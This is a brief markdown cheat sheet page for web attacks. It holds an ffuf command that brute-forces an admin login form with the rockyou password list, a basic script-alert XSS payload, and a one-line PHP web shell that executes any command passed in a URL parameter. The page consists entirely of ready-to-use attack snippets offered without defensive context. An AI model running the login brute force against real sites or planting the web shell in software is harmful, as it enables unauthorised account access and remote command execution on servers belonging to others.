---
title: Cheat Sheet
layout: default
nav_order: 4
---

# Cheat Sheet

[← Go back to main page](./index.md)

## [ffuf](https://github.com/ffuf/ffuf)

### Simple login page

```sh
ffuf \
  -u https://website.com/login \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -X POST -d "username=admin&password=FUZZ" \
  -w /usr/share/wordlists/rockyou.txt:FUZZ  \
  -fr "Incorrect"
```

## XSS

```html
<script>alert(1)</script>
```
  
## Web shell

### PHP

```php
<?php system($_GET['cmd']); ?>
```
